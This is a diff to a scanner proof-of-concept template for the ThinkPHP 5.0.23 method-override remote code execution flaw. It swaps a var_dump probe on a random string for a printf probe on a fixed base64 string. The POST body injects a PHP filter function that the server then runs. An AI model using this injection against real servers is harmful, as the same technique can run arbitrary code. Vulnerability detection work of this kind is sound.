@@ -1,6 +1,4 @@
 name: poc-yaml-thinkphp5023-method-rce
-set:
-  rand: randomLowercase(10)
 groups:
   poc1:
   - method: POST
@@ -8,9 +6,9 @@ groups:
     headers:
       Content-Type: application/x-www-form-urlencoded
     body: |
-      _method=__construct&filter[]=var_dump&method=GET&get[]={{rand}}
+      _method=__construct&filter[]=printf&method=GET&get[]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu
     expression: |
-      response.body.bcontains(bytes(rand))
+      response.body.bcontains(b"TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu")
   poc2:
   - method: POST
     path: /index.php?s=captcha
